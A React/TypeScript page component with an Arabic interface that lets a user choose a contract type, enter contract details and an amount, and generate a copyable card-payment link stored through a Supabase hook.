import { useState } from "react";
import { useParams, useNavigate } from "react-router-dom";
import { Card } from "@/components/ui/card";
import { Button } from "@/components/ui/button";
import { Input } from "@/components/ui/input";
import { Label } from "@/components/ui/label";
import {
  Select,
  SelectContent,
  SelectItem,
  SelectTrigger,
  SelectValue,
} from "@/components/ui/select";
import { getCountryByCode } from "@/lib/countries";
import { formatCurrency, getCurrencyCode, getCurrencySymbol } from "@/lib/countryCurrencies";
import { useCreateLink } from "@/hooks/useSupabase";
import { generatePaymentLink } from "@/utils/paymentLinks";
import { FileText, Copy, Check, ArrowRight } from "lucide-react";
import { useToast } from "@/hooks/use-toast";
import BottomNav from "@/components/BottomNav";
import BackButton from "@/components/BackButton";

const CreateContractsLink = () => {
  const { country } = useParams<{ country: string }>();
  const navigate = useNavigate();
  const { toast } = useToast();
  const countryData = getCountryByCode(country?.toUpperCase() || "");
  
  const createLink = useCreateLink();
  
  const [contractType, setContractType] = useState<string>("");
  const [contractNumber, setContractNumber] = useState<string>("");
  const [clientName, setClientName] = useState<string>("");
  const [providerName, setProviderName] = useState<string>("");
  const [contractAmount, setContractAmount] = useState<number>(0);
  const [createdLink, setCreatedLink] = useState<string | null>(null);
  const [copied, setCopied] = useState(false);
  
  const contractTypes = [
    { value: "rental", label: "عقد إيجار", icon: "🏠", basePrice: 5000 },
    { value: "employment", label: "عقد عمل", icon: "👔", basePrice: 3000 },
    { value: "service", label: "عقد خدمات", icon: "🛠️", basePrice: 2000 },
    { value: "partnership", label: "عقد شراكة", icon: "🤝", basePrice: 10000 },
    { value: "purchase", label: "عقد بيع", icon: "💰", basePrice: 15000 },
    { value: "maintenance", label: "عقد صيانة", icon: "🔧", basePrice: 1500 },
    { value: "consulting", label: "عقد استشاري", icon: "📊", basePrice: 4000 },
    { value: "construction", label: "عقد بناء", icon: "🏗️", basePrice: 50000 },
  ];

  const selectedContractType = contractTypes.find(c => c.value === contractType);
  
  const handleContractTypeChange = (value: string) => {
    setContractType(value);
    const contract = contractTypes.find(c => c.value === value);
    if (contract) {
      setContractAmount(contract.basePrice);
    }
  };
  
  const handleCreate = async () => {
    if (!countryData || !contractType) {
      toast({
        title: "خطأ",
        description: "الرجاء تعبئة جميع الحقول المطلوبة",
        variant: "destructive",
      });
      return;
    }

    const payload = {
      contract_type: contractType,
      contract_type_label: selectedContractType?.label || '',
      contract_type_icon: selectedContractType?.icon || '',
      contract_number: contractNumber,
      client_name: clientName,
      provider_name: providerName,
      payment_amount: contractAmount,
      currency_code: getCurrencyCode(country || "SA"),
      payment_method: "card",
      selectedCountry: country || "SA",
    };

    try {
      const link = await createLink.mutateAsync({
        type: "contracts",
        country_code: country!,
        payload,
      });

      const paymentUrl = generatePaymentLink({
        invoiceId: link.id,
        company: "contracts",
        country: country || 'SA',
        amount: contractAmount,
        currency: getCurrencyCode(country || "SA"),
        paymentMethod: "card",
      });

      setCreatedLink(paymentUrl);
      
      toast({
        title: "تم إنشاء رابط الدفع بنجاح!",
        description: "يمكنك الآن مشاركة الرابط مع العميل",
      });
    } catch (error) {
      toast({
        title: "خطأ في إنشاء الرابط",
        description: "حدث خطأ أثناء إنشاء رابط الدفع. الرجاء المحاولة مرة أخرى",
        variant: "destructive",
      });
    }
  };
  
  const handleCopy = () => {
    if (createdLink) {
      navigator.clipboard.writeText(createdLink);
      setCopied(true);
      setTimeout(() => setCopied(false), 2000);
      toast({
        title: "تم النسخ!",
        description: "تم نسخ الرابط إلى الحافظة",
      });
    }
  };
  
  if (!countryData) {
    return (
      <div className="min-h-screen flex items-center justify-center bg-background" dir="rtl">
        <div className="text-center p-8">
          <FileText className="w-16 h-16 mx-auto mb-4 text-muted-foreground" />
          <h2 className="text-2xl font-bold mb-2 text-foreground">الدولة غير موجودة</h2>
          <p className="text-muted-foreground mb-6">الرجاء اختيار دولة صحيحة</p>
          <Button onClick={() => navigate('/services')}>العودة للخدمات</Button>
        </div>
      </div>
    );
  }
  
  if (createdLink) {
    return (
      <div className="min-h-screen py-6" dir="rtl">
        <div className="container mx-auto px-4">
          <Card className="max-w-xl mx-auto p-4 text-center">
            <div className="w-14 h-14 bg-gradient-success rounded-full flex items-center justify-center mx-auto mb-3">
              <Check className="w-7 h-7 text-white" />
            </div>
            
            <h2 className="text-xl font-bold mb-2">تم إنشاء رابط الدفع بنجاح!</h2>
            <p className="text-sm text-muted-foreground mb-4">
              شارك هذا الرابط لسداد قيمة العقد
            </p>

            <div className="bg-secondary/50 p-4 rounded-lg mb-4 space-y-2 text-right">
              <div className="flex items-center justify-between text-sm">
                <span className="font-semibold">{selectedContractType?.label}</span>
                <span className="text-muted-foreground">نوع العقد:</span>
              </div>
              {contractNumber && (
                <div className="flex items-center justify-between text-sm">
                  <span className="font-semibold">{contractNumber}</span>
                  <span className="text-muted-foreground">رقم العقد:</span>
                </div>
              )}
              {clientName && (
                <div className="flex items-center justify-between text-sm">
                  <span className="font-semibold">{clientName}</span>
                  <span className="text-muted-foreground">اسم العميل:</span>
                </div>
              )}
              {providerName && (
                <div className="flex items-center justify-between text-sm">
                  <span className="font-semibold">{providerName}</span>
                  <span className="text-muted-foreground">مقدم الخدمة:</span>
                </div>
              )}
              <div className="flex items-center justify-between text-sm pt-2 border-t border-border/50">
                <span className="font-bold text-lg">
                  {formatCurrency(contractAmount, getCurrencyCode(country || "SA"))}
                </span>
                <span className="text-muted-foreground">قيمة العقد:</span>
              </div>
            </div>

            <div className="bg-secondary/50 p-3 rounded-lg mb-4 break-all">
              <code className="text-xs">{createdLink}</code>
            </div>

            <div className="flex gap-3 justify-center">
              <Button onClick={handleCopy}>
                {copied ? (
                  <>
                    <Check className="w-4 h-4 ml-2" />
                    <span className="text-sm">تم النسخ</span>
                  </>
                ) : (
                  <>
                    <Copy className="w-4 h-4 ml-2" />
                    <span className="text-sm">نسخ الرابط</span>
                  </>
                )}
              </Button>

              <Button
                variant="outline"
                onClick={() => window.open(createdLink, "_blank")}
              >
                <span className="ml-2 text-sm">عرض المعاينة</span>
                <ArrowRight className="w-4 h-4 mr-2" />
              </Button>
            </div>
            
            <Button
              variant="ghost"
              className="mt-4 text-sm"
              onClick={() => navigate("/services")}
            >
              إنشاء رابط جديد
            </Button>
          </Card>
        </div>
      </div>
    );
  }
  
  return (
    <div className="min-h-screen py-6" dir="rtl">
      <div className="container mx-auto px-4">
        <div className="mb-4">
          <BackButton />
        </div>
        <div className="max-w-2xl mx-auto">
          <div className="mb-4">
            <div className="flex items-center gap-2 mb-3">
              <div
                className="w-10 h-10 rounded-lg flex items-center justify-center"
                style={{
                  background: `linear-gradient(135deg, #F59E0B, #FB923C)`,
                }}
              >
                <FileText className="w-5 h-5 text-white" />
              </div>
              <div>
                <h1 className="text-xl font-bold">العقود - {countryData.nameAr}</h1>
                <p className="text-xs text-muted-foreground">أنشئ رابط دفع لعقد</p>
              </div>
            </div>
          </div>
          
          <Card className="p-4">
            <div className="space-y-4">
              <div>
                <Label className="text-sm mb-2">نوع العقد *</Label>
                <Select value={contractType} onValueChange={handleContractTypeChange}>
                  <SelectTrigger className="w-full h-10">
                    <SelectValue placeholder="اختر نوع العقد..." />
                  </SelectTrigger>
                  <SelectContent>
                    {contractTypes.map((type) => (
                      <SelectItem key={type.value} value={type.value}>
                        <div className="flex items-center gap-2">
                          <span>{type.icon}</span>
                          <span className="text-sm">{type.label}</span>
                        </div>
                      </SelectItem>
                    ))}
                  </SelectContent>
                </Select>
              </div>
              
              {contractType && (
                <>
                  <div>
                    <Label className="text-sm mb-2">
                      رقم العقد (اختياري)
                    </Label>
                    <Input
                      type="text"
                      value={contractNumber}
                      onChange={(e) => setContractNumber(e.target.value)}
                      placeholder="مثال: CT-2024-001"
                      className="h-9 text-sm"
                    />
                  </div>
                  
                  <div>
                    <Label className="text-sm mb-2">
                      اسم العميل (اختياري)
                    </Label>
                    <Input
                      type="text"
                      value={clientName}
                      onChange={(e) => setClientName(e.target.value)}
                      placeholder="أدخل اسم العميل..."
                      className="h-9 text-sm"
                    />
                  </div>
                  
                  <div>
                    <Label className="text-sm mb-2">
                      اسم مقدم الخدمة (اختياري)
                    </Label>
                    <Input
                      type="text"
                      value={providerName}
                      onChange={(e) => setProviderName(e.target.value)}
                      placeholder="أدخل اسم مقدم الخدمة..."
                      className="h-9 text-sm"
                    />
                  </div>
                  
                  <div>
                    <Label className="text-sm mb-2">
                      قيمة العقد ({getCurrencySymbol(country || "SA")})
                    </Label>
                    <Input
                      type="number"
                      value={contractAmount}
                      onChange={(e) => setContractAmount(Number(e.target.value))}
                      className="h-9 text-sm"
                      min="0"
                      step="0.01"
                    />
                    <p className="text-xs text-muted-foreground mt-1">
                      💡 القيمة الافتراضية: {selectedContractType?.basePrice} {getCurrencySymbol(country || "SA")}
                    </p>
                  </div>
                  
                  <div className="bg-gradient-to-r from-amber-500 to-orange-500 p-4 rounded-xl text-white">
                    <p className="text-xs mb-1">المبلغ الإجمالي</p>
                    <p className="text-2xl font-bold">
                      {formatCurrency(contractAmount, getCurrencyCode(country || "SA"))}
                    </p>
                  </div>
                  
                  <Button
                    onClick={handleCreate}
                    disabled={createLink.isPending}
                    className="w-full py-5"
                  >
                    {createLink.isPending ? (
                      <span className="text-sm">جاري الإنشاء...</span>
                    ) : (
                      <>
                        <span className="ml-2 text-sm">إنشاء رابط الدفع</span>
                        <ArrowRight className="w-4 h-4 mr-2" />
                      </>
                    )}
                  </Button>
                </>
              )}
            </div>
          </Card>
        </div>
      </div>
      <div className="h-20" />
      <BottomNav />
    </div>
  );
};

export default CreateContractsLink;
